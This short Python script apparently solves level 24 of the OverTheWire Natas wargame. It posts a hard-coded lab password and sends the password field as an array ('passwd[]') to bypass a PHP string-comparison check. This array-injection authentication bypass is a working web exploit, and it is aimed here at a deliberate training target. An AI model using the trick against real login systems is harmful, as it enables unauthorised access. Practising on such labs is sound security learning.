import requests
from string import *


username = "natas24"
password = "MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd"
url = f"http://{username}.natas.labs.overthewire.org"

pw = ""
session = requests.Session()
response = session.post(url, auth=(username, password), data={"passwd[]": "20iloveyou"})
print(response.text)
print("Status code:", response.status_code)
